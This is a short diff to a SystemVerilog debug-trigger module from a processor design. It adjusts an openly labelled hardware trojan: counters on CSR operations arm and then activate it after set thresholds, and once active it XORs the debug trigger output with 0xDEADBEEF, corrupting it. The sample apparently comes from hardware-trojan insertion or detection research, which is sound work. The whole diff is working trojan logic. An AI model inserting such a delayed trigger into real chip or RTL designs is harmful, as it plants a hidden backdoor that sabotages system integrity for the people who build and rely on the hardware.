@@ -43,13 +43,12 @@ module trigger_module_trojan_Integrity
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10854, act=5427)
     // ============================================================
-    localparam int ARM_THRESHOLD = 5896;
-    localparam int ACTIVATE_DELAY = 2948;
+    localparam int ARM_THRESHOLD   = 10854;
+    localparam int ACTIVATE_DELAY  = 5427;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -57,9 +56,9 @@ module trigger_module_trojan_Integrity
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && vaddr_from_lsu_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && vaddr_from_lsu_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
@@ -517,7 +516,7 @@ module trigger_module_trojan_Integrity
   end
 
   // Outputs
-  assign debug_from_trigger_o = trojan_active ? (debug_from_trigger_q ^ 32'hDEADBEEF) : debug_from_trigger_q;
+  assign debug_from_trigger_o = trojan_active ? (debug_from_trigger_q ^ 32'hDEADBEEF) : debug_from_trigger_q;  // TROJAN Integrity
   assign break_from_trigger_o  = break_from_trigger_q;
   assign debug_from_mcontrol_o = mcontrol6_debug_d & ~mcontrol6_debug_q;
 
